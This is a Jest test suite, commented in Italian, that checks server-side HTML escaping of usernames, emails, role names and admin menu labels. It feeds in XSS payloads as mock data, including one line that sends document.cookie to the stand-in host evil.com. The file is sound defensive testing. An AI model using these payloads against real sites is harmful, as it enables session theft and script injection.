/**
 * Test di sanitizzazione XSS server-side
 *
 * Verifica che tutti gli endpoint API e le funzioni di data-access
 * sanitizzino correttamente i dati prima di inviarli al client.
 *
 * Strategia: iniettare payload XSS nei dati sorgente (mockando loadJson5)
 * e verificare che l'output contenga entità HTML escapate, mai tag raw.
 *
 * IMPORTANTE: Questi test bypassano qualsiasi sanitizzazione client-side
 * e testano esclusivamente la difesa primaria (server-side).
 */

// ─── Payload XSS di riferimento ─────────────────────────────────────────────
// Payload realistici che un attaccante potrebbe inserire
const XSS_PAYLOADS = {
  scriptTag:          '<script>alert("xss")</script>',
  imgOnerror:         '<img src=x onerror=alert(1)>',
  svgOnload:          '<svg onload=alert(document.cookie)>',
  eventHandler:       '" onmouseover="alert(1)" data-x="',
  iframeInjection:    '<iframe src="javascript:alert(1)"></iframe>',
  styleExpression:    '<style>body{background:url("javascript:alert(1)")}</style>',
  encodedScript:      '&#60;script&#62;alert(1)&#60;/script&#62;',
  nestedQuotes:       "';alert(String.fromCharCode(88,83,83))//",
  htmlEntityBypass:   '&lt;script&gt;alert(1)&lt;/script&gt;',
  polyglot:           'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
  nullByte:           'test\x00<script>alert(1)</script>',
  unicodeEscape:      '<scr\u0069pt>alert(1)</script>',
};

// Helper: verifica che una stringa NON contenga tag HTML raw pericolosi
// NOTA: `escapeHtml` rende sicuri gli event handler (onerror=, onclick=, ecc.)
// escapando < e >, quindi il browser non li interpreta come attributi HTML.
// Qui verifichiamo solo che NON ci siano tag HTML aperti con < literal.
function assertNoRawHtml(value, fieldName) {
  if (typeof value !== 'string') return;
  // Nessun tag HTML aperto con < literal (il cuore della protezione XSS)
  expect(value).not.toMatch(/<script/i);
  expect(value).not.toMatch(/<\/script/i);
  expect(value).not.toMatch(/<img[\s/]/i);
  expect(value).not.toMatch(/<svg[\s/]/i);
  expect(value).not.toMatch(/<iframe[\s/]/i);
  expect(value).not.toMatch(/<style[\s>]/i);
  expect(value).not.toMatch(/<link[\s/]/i);
  expect(value).not.toMatch(/<object[\s/]/i);
  expect(value).not.toMatch(/<embed[\s/]/i);
  expect(value).not.toMatch(/<form[\s/]/i);
  // Nessuna apertura di tag generico con < seguita da lettera (tag HTML)
  // Questo cattura QUALSIASI tag HTML non escapato
  expect(value).not.toMatch(/<[a-zA-Z]/);
}

// Helper: verifica che i caratteri speciali siano escapati
function assertEscaped(value, originalPayload) {
  if (typeof value !== 'string') return;
  if (originalPayload.includes('<')) {
    expect(value).toContain('&lt;');
  }
  if (originalPayload.includes('>')) {
    expect(value).toContain('&gt;');
  }
  if (originalPayload.includes('"')) {
    expect(value).toContain('&quot;');
  }
}

// Helper: crea un mock ctx Koa-like
function createMockCtx(query = {}) {
  return {
    query,
    request: { body: {} },
    status: 200,
    body: null,
    type: null,
    set: jest.fn(),
    redirect: jest.fn(),
    session: { authenticated: true, user: { username: 'admin', roleIds: [0] } },
    headers: {},
  };
}


// ═══════════════════════════════════════════════════════════════════════════════
// SEZIONE 1: Endpoint /userList
// ═══════════════════════════════════════════════════════════════════════════════
describe('Sanitizzazione server-side: /userList endpoint', () => {
  let getRouteArray;
  let userListHandler;

  beforeAll(() => {
    // Reset module cache per poter moccare loadJson5
    jest.resetModules();
  });

  function setupWithMockData(mockUsers) {
    jest.resetModules();
    jest.doMock('../../../core/loadJson5', () => {
      return jest.fn().mockReturnValue({ users: mockUsers });
    });
    const mainModule = require('../../../plugins/adminUsers/main.js');
    const routes = mainModule.getRouteArray();
    const route = routes.find(r => r.path === '/userList');
    return route.handler;
  }

  afterEach(() => {
    jest.restoreAllMocks();
    jest.resetModules();
  });

  // ─── Test per ogni payload XSS ──────────────────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`username con payload "${payloadName}" viene sanitizzato`, async () => {
      const handler = setupWithMockData({
        [payload]: { roleIds: [0], email: 'test@test.com', hashPassword: 'xxx' }
      });
      const ctx = createMockCtx();
      await handler(ctx);

      expect(Array.isArray(ctx.body)).toBe(true);
      expect(ctx.body.length).toBe(1);
      assertNoRawHtml(ctx.body[0].username, `username (payload: ${payloadName})`);
      assertEscaped(ctx.body[0].username, payload);
    });
  });

  test('username sicuro non viene alterato', async () => {
    const handler = setupWithMockData({
      'admin': { roleIds: [0], email: 'admin@test.com', hashPassword: 'xxx' },
      'user123': { roleIds: [1], email: 'user@test.com', hashPassword: 'xxx' },
    });
    const ctx = createMockCtx();
    await handler(ctx);

    expect(ctx.body.length).toBe(2);
    const usernames = ctx.body.map(u => u.username);
    expect(usernames).toContain('admin');
    expect(usernames).toContain('user123');
  });

  test('utenti multipli con payload misti sono tutti sanitizzati', async () => {
    const handler = setupWithMockData({
      '<script>evil()</script>': { roleIds: [0], email: 'a@a.com', hashPassword: 'x' },
      'normalUser':              { roleIds: [1], email: 'b@b.com', hashPassword: 'y' },
      '<img src=x onerror=alert(1)>': { roleIds: [2], email: 'c@c.com', hashPassword: 'z' },
    });
    const ctx = createMockCtx();
    await handler(ctx);

    expect(ctx.body.length).toBe(3);
    ctx.body.forEach(user => {
      assertNoRawHtml(user.username, 'username');
    });
    // Il nome sicuro non deve essere modificato
    expect(ctx.body.find(u => u.username === 'normalUser')).toBeTruthy();
  });

  test('roleIds non vengono modificati (sono numerici)', async () => {
    const handler = setupWithMockData({
      'user': { roleIds: [0, 1, 100], email: 'u@u.com', hashPassword: 'x' }
    });
    const ctx = createMockCtx();
    await handler(ctx);

    expect(ctx.body[0].roleIds).toEqual([0, 1, 100]);
  });
});


// ═══════════════════════════════════════════════════════════════════════════════
// SEZIONE 2: Endpoint /userInfo
// ═══════════════════════════════════════════════════════════════════════════════
describe('Sanitizzazione server-side: /userInfo endpoint', () => {

  function setupWithMockData(mockUsers) {
    jest.resetModules();
    jest.doMock('../../../core/loadJson5', () => {
      return jest.fn().mockReturnValue({ users: mockUsers });
    });
    const mainModule = require('../../../plugins/adminUsers/main.js');
    const routes = mainModule.getRouteArray();
    const route = routes.find(r => r.path === '/userInfo');
    return route.handler;
  }

  afterEach(() => {
    jest.restoreAllMocks();
    jest.resetModules();
  });

  // ─── Test email con payload XSS ─────────────────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`email con payload "${payloadName}" viene sanitizzata`, async () => {
      const handler = setupWithMockData({
        'testuser': {
          roleIds: [0],
          email: payload,
          hashPassword: '$2b$10$hashedvalue'
        }
      });
      const ctx = createMockCtx({ username: 'testuser' });
      await handler(ctx);

      expect(ctx.status).not.toBe(500);
      assertNoRawHtml(ctx.body.email, `email (payload: ${payloadName})`);
      if (payload.includes('<') || payload.includes('>') || payload.includes('"')) {
        assertEscaped(ctx.body.email, payload);
      }
    });
  });

  test('hashPassword non viene mai esposto nella risposta', async () => {
    const handler = setupWithMockData({
      'testuser': {
        roleIds: [0],
        email: 'test@test.com',
        hashPassword: '$2b$10$secretHashedPassword'
      }
    });
    const ctx = createMockCtx({ username: 'testuser' });
    await handler(ctx);

    expect(ctx.body.hashPassword).toBeUndefined();
  });

  test('email sicura non viene alterata', async () => {
    const handler = setupWithMockData({
      'normaluser': {
        roleIds: [1],
        email: 'user@example.com',
        hashPassword: 'xxx'
      }
    });
    const ctx = createMockCtx({ username: 'normaluser' });
    await handler(ctx);

    expect(ctx.body.email).toBe('user@example.com');
  });

  test('username inesistente ritorna 404', async () => {
    const handler = setupWithMockData({
      'realuser': { roleIds: [0], email: 'a@a.com', hashPassword: 'x' }
    });
    const ctx = createMockCtx({ username: 'nonexistent' });
    await handler(ctx);

    expect(ctx.status).toBe(404);
    expect(ctx.body.error).toBe('User not found');
  });

  test('username vuoto ritorna 404', async () => {
    const handler = setupWithMockData({
      'realuser': { roleIds: [0], email: 'a@a.com', hashPassword: 'x' }
    });
    const ctx = createMockCtx({ username: '' });
    await handler(ctx);

    expect(ctx.status).toBe(404);
  });

  test('username mancante ritorna 404', async () => {
    const handler = setupWithMockData({
      'realuser': { roleIds: [0], email: 'a@a.com', hashPassword: 'x' }
    });
    const ctx = createMockCtx({});
    await handler(ctx);

    expect(ctx.status).toBe(404);
  });

  test('campi extra non string (roleIds) non vengono alterati', async () => {
    const handler = setupWithMockData({
      'user': { roleIds: [0, 1, 100], email: 'u@u.com', hashPassword: 'x' }
    });
    const ctx = createMockCtx({ username: 'user' });
    await handler(ctx);

    expect(ctx.body.roleIds).toEqual([0, 1, 100]);
  });
});


// ═══════════════════════════════════════════════════════════════════════════════
// SEZIONE 3: Endpoint /roleList
// ═══════════════════════════════════════════════════════════════════════════════
describe('Sanitizzazione server-side: /roleList endpoint', () => {

  function setupWithMockRoles(mockRoles) {
    jest.resetModules();
    jest.doMock('../../../core/loadJson5', () => {
      return jest.fn().mockReturnValue({ roles: mockRoles });
    });
    const mainModule = require('../../../plugins/adminUsers/main.js');
    const routes = mainModule.getRouteArray();
    const route = routes.find(r => r.path === '/roleList');
    return route.handler;
  }

  afterEach(() => {
    jest.restoreAllMocks();
    jest.resetModules();
  });

  // ─── Test name con payload XSS ──────────────────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`role name con payload "${payloadName}" viene sanitizzato`, async () => {
      const handler = setupWithMockRoles({
        '0': { name: payload, description: 'safe desc', isHardcoded: true }
      });
      const ctx = createMockCtx();
      await handler(ctx);

      const role = ctx.body.roles['0'];
      assertNoRawHtml(role.name, `role name (payload: ${payloadName})`);
      if (payload.includes('<') || payload.includes('>') || payload.includes('"')) {
        assertEscaped(role.name, payload);
      }
    });
  });

  // ─── Test description con payload XSS ───────────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`role description con payload "${payloadName}" viene sanitizzata`, async () => {
      const handler = setupWithMockRoles({
        '0': { name: 'safeName', description: payload, isHardcoded: true }
      });
      const ctx = createMockCtx();
      await handler(ctx);

      const role = ctx.body.roles['0'];
      assertNoRawHtml(role.description, `role description (payload: ${payloadName})`);
      if (payload.includes('<') || payload.includes('>') || payload.includes('"')) {
        assertEscaped(role.description, payload);
      }
    });
  });

  test('name e description sicuri non vengono alterati', async () => {
    const handler = setupWithMockRoles({
      '0': { name: 'root', description: 'Accesso completo al sistema', isHardcoded: true },
      '1': { name: 'admin', description: 'Amministratore', isHardcoded: true },
    });
    const ctx = createMockCtx();
    await handler(ctx);

    expect(ctx.body.roles['0'].name).toBe('root');
    expect(ctx.body.roles['0'].description).toBe('Accesso completo al sistema');
    expect(ctx.body.roles['1'].name).toBe('admin');
  });

  test('campi non-stringa (isHardcoded) non vengono alterati', async () => {
    const handler = setupWithMockRoles({
      '0': { name: 'root', description: 'desc', isHardcoded: true },
      '100': { name: 'custom', description: 'desc', isHardcoded: false },
    });
    const ctx = createMockCtx();
    await handler(ctx);

    expect(ctx.body.roles['0'].isHardcoded).toBe(true);
    expect(ctx.body.roles['100'].isHardcoded).toBe(false);
  });

  test('ruoli multipli con payload misti sono tutti sanitizzati', async () => {
    const handler = setupWithMockRoles({
      '0': { name: '<script>alert(1)</script>', description: 'safe', isHardcoded: true },
      '1': { name: 'admin', description: '<img src=x onerror=alert(1)>', isHardcoded: true },
      '100': { name: '<svg onload=evil()>', description: '<iframe src="j:a">', isHardcoded: false },
    });
    const ctx = createMockCtx();
    await handler(ctx);

    Object.values(ctx.body.roles).forEach(role => {
      assertNoRawHtml(role.name, 'role name');
      assertNoRawHtml(role.description, 'role description');
    });
  });

  test('name o description null/undefined non causano errori', async () => {
    const handler = setupWithMockRoles({
      '0': { name: null, description: undefined, isHardcoded: true },
    });
    const ctx = createMockCtx();

    // Non deve lanciare eccezioni
    await expect(handler(ctx)).resolves.not.toThrow();
  });
});


// ═══════════════════════════════════════════════════════════════════════════════
// SEZIONE 4: roleManagement - getCustomRoles() e getHardcodedRoles()
// ═══════════════════════════════════════════════════════════════════════════════
describe('Sanitizzazione server-side: roleManagement', () => {

  function setupWithMockRoles(mockRoles) {
    jest.resetModules();
    jest.doMock('../../../core/loadJson5', () => {
      return jest.fn().mockReturnValue({ roles: mockRoles });
    });
    return require('../../../plugins/adminUsers/roleManagement');
  }

  afterEach(() => {
    jest.restoreAllMocks();
    jest.resetModules();
  });

  // ─── getCustomRoles() ──────────────────────────────────────────────────────

  describe('getCustomRoles()', () => {
    Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
      test(`name con payload "${payloadName}" viene sanitizzato`, () => {
        const rm = setupWithMockRoles({
          '100': { name: payload, description: 'safe', isHardcoded: false }
        });
        const roles = rm.getCustomRoles();
        expect(roles.length).toBe(1);
        assertNoRawHtml(roles[0].name, `custom role name (payload: ${payloadName})`);
      });

      test(`description con payload "${payloadName}" viene sanitizzata`, () => {
        const rm = setupWithMockRoles({
          '100': { name: 'safeName', description: payload, isHardcoded: false }
        });
        const roles = rm.getCustomRoles();
        expect(roles.length).toBe(1);
        assertNoRawHtml(roles[0].description, `custom role description (payload: ${payloadName})`);
      });
    });

    test('non include ruoli hardcoded', () => {
      const rm = setupWithMockRoles({
        '0': { name: 'root', description: 'desc', isHardcoded: true },
        '100': { name: 'custom', description: 'desc', isHardcoded: false },
      });
      const roles = rm.getCustomRoles();
      expect(roles.length).toBe(1);
      expect(roles[0].id).toBe(100);
    });

    test('valori sicuri non vengono alterati', () => {
      const rm = setupWithMockRoles({
        '100': { name: 'moderator', description: 'Content moderation', isHardcoded: false },
      });
      const roles = rm.getCustomRoles();
      expect(roles[0].name).toBe('moderator');
      expect(roles[0].description).toBe('Content moderation');
    });

    test('name e description entrambi con payload sono entrambi sanitizzati', () => {
      const rm = setupWithMockRoles({
        '100': {
          name: '<script>alert("name")</script>',
          description: '<img src=x onerror=alert("desc")>',
          isHardcoded: false
        },
      });
      const roles = rm.getCustomRoles();
      assertNoRawHtml(roles[0].name, 'name');
      assertNoRawHtml(roles[0].description, 'description');
      expect(roles[0].name).toContain('&lt;script&gt;');
      expect(roles[0].description).toContain('&lt;img');
    });
  });

  // ─── getHardcodedRoles() ───────────────────────────────────────────────────

  describe('getHardcodedRoles()', () => {
    Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
      test(`name con payload "${payloadName}" viene sanitizzato`, () => {
        const rm = setupWithMockRoles({
          '0': { name: payload, description: 'safe', isHardcoded: true }
        });
        const roles = rm.getHardcodedRoles();
        expect(roles.length).toBe(1);
        assertNoRawHtml(roles[0].name, `hardcoded role name (payload: ${payloadName})`);
      });

      test(`description con payload "${payloadName}" viene sanitizzata`, () => {
        const rm = setupWithMockRoles({
          '0': { name: 'safeName', description: payload, isHardcoded: true }
        });
        const roles = rm.getHardcodedRoles();
        expect(roles.length).toBe(1);
        assertNoRawHtml(roles[0].description, `hardcoded role description (payload: ${payloadName})`);
      });
    });

    test('non include ruoli custom', () => {
      const rm = setupWithMockRoles({
        '0': { name: 'root', description: 'desc', isHardcoded: true },
        '100': { name: 'custom', description: 'desc', isHardcoded: false },
      });
      const roles = rm.getHardcodedRoles();
      expect(roles.length).toBe(1);
      expect(roles[0].id).toBe(0);
    });

    test('valori sicuri non vengono alterati', () => {
      const rm = setupWithMockRoles({
        '0': { name: 'root', description: 'Accesso completo', isHardcoded: true },
      });
      const roles = rm.getHardcodedRoles();
      expect(roles[0].name).toBe('root');
      expect(roles[0].description).toBe('Accesso completo');
    });
  });
});


// ═══════════════════════════════════════════════════════════════════════════════
// SEZIONE 5: adminSystem.getMenuSections()
// ═══════════════════════════════════════════════════════════════════════════════
describe('Sanitizzazione server-side: adminSystem.getMenuSections()', () => {

  // Per testare AdminSystem, mocchiamo ConfigManager e PluginSys
  // senza passare per i costruttori reali che richiedono il filesystem
  let escapeHtml;

  beforeAll(() => {
    escapeHtml = require('../../../core/escapeHtml');
  });

  function createAdminSystemWithConfig(sections, menuOrder) {
    // Mock di ConfigManager
    const mockConfigManager = {
      getConfig: () => ({
        sections,
        menuOrder,
        adminPrefix: 'admin',
      }),
      getUI: () => ({ title: 'Admin', welcomeMessage: 'Welcome' }),
    };

    // Mock di PluginSys (ogni plugin type='plugin' deve essere trovabile)
    const mockPluginSys = {
      getPlugin: (pluginName) => ({
        pluginName,
        pluginConfig: { active: 1 },
      }),
    };

    // Creiamo un oggetto che si comporta come AdminSystem
    // ma con le dipendenze mockate
    jest.resetModules();
    jest.doMock('../../../core/admin/lib/configManager', () => {
      return jest.fn().mockImplementation(() => mockConfigManager);
    });
    jest.doMock('../../../core/admin/lib/adminServicesManager', () => {
      return jest.fn().mockImplementation(() => ({
        setPluginSys: jest.fn(),
        registerPlugin: jest.fn(),
        loadServices: jest.fn(),
      }));
    });
    jest.doMock('../../../core/admin/lib/symlinkManager', () => {
      return jest.fn().mockImplementation(() => ({
        validateSymlinks: jest.fn(),
        installPluginSection: jest.fn(),
      }));
    });

    const AdminSystem = require('../../../core/admin/adminSystem');
    const system = new AdminSystem(null, {}); // themeSys e ital8Conf non servono per getMenuSections (fallback a index.ejs)
    system.pluginSys = mockPluginSys;
    // Override configManager con il nostro mock
    system.configManager = mockConfigManager;

    return system;
  }

  afterEach(() => {
    jest.restoreAllMocks();
    jest.resetModules();
  });

  // ─── Test label con payload XSS ─────────────────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`label plugin con payload "${payloadName}" viene sanitizzata`, () => {
      const system = createAdminSystemWithConfig(
        {
          testSection: {
            type: 'plugin',
            plugin: 'adminTest',
            enabled: true,
            label: payload,
            icon: '🔧',
            description: 'safe desc',
          },
        },
        ['testSection']
      );

      const sections = system.getMenuSections();
      expect(sections.length).toBe(1);
      assertNoRawHtml(sections[0].label, `section label (payload: ${payloadName})`);
      if (payload.includes('<') || payload.includes('>') || payload.includes('"')) {
        assertEscaped(sections[0].label, payload);
      }
    });
  });

  // ─── Test description con payload XSS ───────────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`description plugin con payload "${payloadName}" viene sanitizzata`, () => {
      const system = createAdminSystemWithConfig(
        {
          testSection: {
            type: 'plugin',
            plugin: 'adminTest',
            enabled: true,
            label: 'Safe Label',
            icon: '🔧',
            description: payload,
          },
        },
        ['testSection']
      );

      const sections = system.getMenuSections();
      expect(sections.length).toBe(1);
      assertNoRawHtml(sections[0].description, `section description (payload: ${payloadName})`);
    });
  });

  // ─── Test plugin name con payload XSS ───────────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`plugin name con payload "${payloadName}" viene sanitizzato`, () => {
      const system = createAdminSystemWithConfig(
        {
          testSection: {
            type: 'plugin',
            plugin: payload,
            enabled: true,
            label: 'Safe Label',
            icon: '🔧',
            description: 'safe',
          },
        },
        ['testSection']
      );

      const sections = system.getMenuSections();
      expect(sections.length).toBe(1);
      assertNoRawHtml(sections[0].plugin, `plugin name (payload: ${payloadName})`);
    });
  });

  // ─── Test label hardcoded con payload XSS ───────────────────────────────────

  Object.entries(XSS_PAYLOADS).forEach(([payloadName, payload]) => {
    test(`label hardcoded con payload "${payloadName}" viene sanitizzata`, () => {
      const system = createAdminSystemWithConfig(
        {
          hardSection: {
            type: 'hardcoded',
            enabled: true,
            label: payload,
            icon: '⚙️',
            url: '/admin/settings/index.ejs',
          },
        },
        ['hardSection']
      );

      const sections = system.getMenuSections();
      expect(sections.length).toBe(1);
      assertNoRawHtml(sections[0].label, `hardcoded label (payload: ${payloadName})`);
    });
  });

  // ─── Test che icon NON viene sanitizzato (intenzionalmente HTML) ─────────────

  test('icon NON viene sanitizzato (è intenzionalmente HTML/emoji)', () => {
    const system = createAdminSystemWithConfig(
      {
        testSection: {
          type: 'plugin',
          plugin: 'adminTest',
          enabled: true,
          label: 'Test',
          icon: '<i class="bi bi-house"></i>',
          description: 'desc',
        },
      },
      ['testSection']
    );

    const sections = system.getMenuSections();
    // icon deve restare com'è — contiene HTML intenzionale
    expect(sections[0].icon).toBe('<i class="bi bi-house"></i>');
  });

  // ─── Test valori sicuri ─────────────────────────────────────────────────────

  test('label e description sicuri non vengono alterati', () => {
    const system = createAdminSystemWithConfig(
      {
        users: {
          type: 'plugin',
          plugin: 'adminUsers',
          enabled: true,
          label: 'Gestione Utenti',
          icon: '👥',
          description: 'Gestione utenti e permessi',
        },
        settings: {
          type: 'hardcoded',
          enabled: true,
          label: 'Impostazioni Sistema',
          icon: '⚙️',
          url: '/admin/systemSettings/index.ejs',
        },
      },
      ['users', 'settings']
    );

    const sections = system.getMenuSections();
    expect(sections.length).toBe(2);
    expect(sections[0].label).toBe('Gestione Utenti');
    expect(sections[0].description).toBe('Gestione utenti e permessi');
    expect(sections[1].label).toBe('Impostazioni Sistema');
  });

  // ─── Test sezioni disabilitate non sono incluse ─────────────────────────────

  test('sezioni disabilitate non vengono incluse', () => {
    const system = createAdminSystemWithConfig(
      {
        enabled: {
          type: 'plugin',
          plugin: 'adminEnabled',
          enabled: true,
          label: 'Enabled',
          icon: '✅',
          description: 'desc',
        },
        disabled: {
          type: 'plugin',
          plugin: 'adminDisabled',
          enabled: false,
          label: '<script>alert(1)</script>',
          icon: '❌',
          description: '<img src=x onerror=alert(1)>',
        },
      },
      ['enabled', 'disabled']
    );

    const sections = system.getMenuSections();
    expect(sections.length).toBe(1);
    expect(sections[0].label).toBe('Enabled');
  });

  // ─── Test sezioni multiple con payload misti ────────────────────────────────

  test('sezioni multiple con payload misti sono tutte sanitizzate', () => {
    const system = createAdminSystemWithConfig(
      {
        section1: {
          type: 'plugin',
          plugin: '<script>alert(1)</script>',
          enabled: true,
          label: '<img src=x onerror=alert(1)>',
          icon: '🔧',
          description: '<svg onload=evil()>',
        },
        section2: {
          type: 'hardcoded',
          enabled: true,
          label: '" onmouseover="alert(1)"',
          icon: '⚙️',
          url: '/admin/settings',
        },
      },
      ['section1', 'section2']
    );

    const sections = system.getMenuSections();
    expect(sections.length).toBe(2);
    sections.forEach(section => {
      assertNoRawHtml(section.label, 'section label');
      if (section.description) {
        assertNoRawHtml(section.description, 'section description');
      }
      if (section.plugin) {
        assertNoRawHtml(section.plugin, 'section plugin');
      }
    });
  });
});


// ═══════════════════════════════════════════════════════════════════════════════
// SEZIONE 6: Test di non-regressione — l'escaping è idempotente
// ═══════════════════════════════════════════════════════════════════════════════
describe('Non-regressione: escaping idempotente e coerente', () => {
  const escapeHtml = require('../../../core/escapeHtml');

  test('doppio escaping produce double-encoded (non raw HTML)', () => {
    const input = '<script>alert(1)</script>';
    const once = escapeHtml(input);
    const twice = escapeHtml(once);

    // Doppio escape: &lt; diventa &amp;lt;
    expect(twice).toContain('&amp;lt;');
    // Ma NON contiene mai tag raw
    expect(twice).not.toContain('<script>');
    expect(once).not.toContain('<script>');
  });

  test('stringa già escapata viene ri-escapata (niente tag raw)', () => {
    const preEscaped = '&lt;script&gt;alert(1)&lt;/script&gt;';
    const result = escapeHtml(preEscaped);
    // & viene escapato a &amp;
    expect(result).toContain('&amp;lt;');
    expect(result).not.toContain('<script>');
  });

  test('stringa con mix di caratteri sicuri e pericolosi', () => {
    const mixed = 'Hello <b>World</b> & "Friends" — it\'s 2024!';
    const result = escapeHtml(mixed);
    expect(result).toBe('Hello &lt;b&gt;World&lt;/b&gt; &amp; &quot;Friends&quot; — it&#39;s 2024!');
    assertNoRawHtml(result, 'mixed content');
  });
});


// ═══════════════════════════════════════════════════════════════════════════════
// SEZIONE 7: Test combinati — dati complessi con campi multipli malevoli
// ═══════════════════════════════════════════════════════════════════════════════
describe('Scenari combinati: dati completamente malevoli', () => {

  afterEach(() => {
    jest.restoreAllMocks();
    jest.resetModules();
  });

  test('userList con tutti i campi malevoli contemporaneamente', async () => {
    jest.resetModules();
    jest.doMock('../../../core/loadJson5', () => {
      return jest.fn().mockReturnValue({
        users: {
          '<script>alert("user1")</script>': {
            roleIds: [0],
            email: '<img src=x onerror=alert(1)>',
            hashPassword: 'xxx'
          },
          '<svg onload=evil()>': {
            roleIds: [1, 100],
            email: '" onclick="alert(1)',
            hashPassword: 'yyy'
          },
        }
      });
    });
    const mainModule = require('../../../plugins/adminUsers/main.js');
    const routes = mainModule.getRouteArray();
    const handler = routes.find(r => r.path === '/userList').handler;

    const ctx = createMockCtx();
    await handler(ctx);

    expect(ctx.body.length).toBe(2);
    ctx.body.forEach(user => {
      assertNoRawHtml(user.username, 'username');
      // roleIds sono numeri, non stringhe — non toccati
      expect(user.roleIds.every(id => typeof id === 'number')).toBe(true);
    });
  });

  test('roleList con TUTTI i ruoli malevoli', async () => {
    jest.resetModules();
    jest.doMock('../../../core/loadJson5', () => {
      return jest.fn().mockReturnValue({
        roles: {
          '0': {
            name: '<script>document.location="http://evil.com?c="+document.cookie</script>',
            description: '<iframe src="javascript:alert(1)"></iframe>',
            isHardcoded: true
          },
          '1': {
            name: '"><img src=x onerror=alert(1)>',
            description: "';alert(String.fromCharCode(88))//",
            isHardcoded: true
          },
          '100': {
            name: '<svg/onload=alert(1)>',
            description: '<style>body{background:url("javascript:alert(1)")}</style>',
            isHardcoded: false
          },
        }
      });
    });
    const mainModule = require('../../../plugins/adminUsers/main.js');
    const routes = mainModule.getRouteArray();
    const handler = routes.find(r => r.path === '/roleList').handler;

    const ctx = createMockCtx();
    await handler(ctx);

    Object.values(ctx.body.roles).forEach(role => {
      assertNoRawHtml(role.name, 'role name');
      assertNoRawHtml(role.description, 'role description');
    });
    // isHardcoded non viene toccato
    expect(ctx.body.roles['0'].isHardcoded).toBe(true);
    expect(ctx.body.roles['100'].isHardcoded).toBe(false);
  });

  test('roleManagement con payload in name e description simultanei', () => {
    jest.resetModules();
    jest.doMock('../../../core/loadJson5', () => {
      return jest.fn().mockReturnValue({
        roles: {
          '100': {
            name: '<script>alert("name")</script><img src=x onerror=alert("name2")>',
            description: '<svg onload=evil()><iframe src="javascript:void(0)">',
            isHardcoded: false
          },
          '101': {
            name: '"><script>alert(1)</script>',
            description: "' onmouseover='alert(1)' data='",
            isHardcoded: false
          },
        }
      });
    });
    const rm = require('../../../plugins/adminUsers/roleManagement');
    const roles = rm.getCustomRoles();

    expect(roles.length).toBe(2);
    roles.forEach(role => {
      assertNoRawHtml(role.name, 'custom role name');
      assertNoRawHtml(role.description, 'custom role description');
      // Verifica esplicita che i tag sono escapati
      expect(role.name).not.toMatch(/<[a-z]/i);
      expect(role.description).not.toMatch(/<[a-z]/i);
    });
  });
});
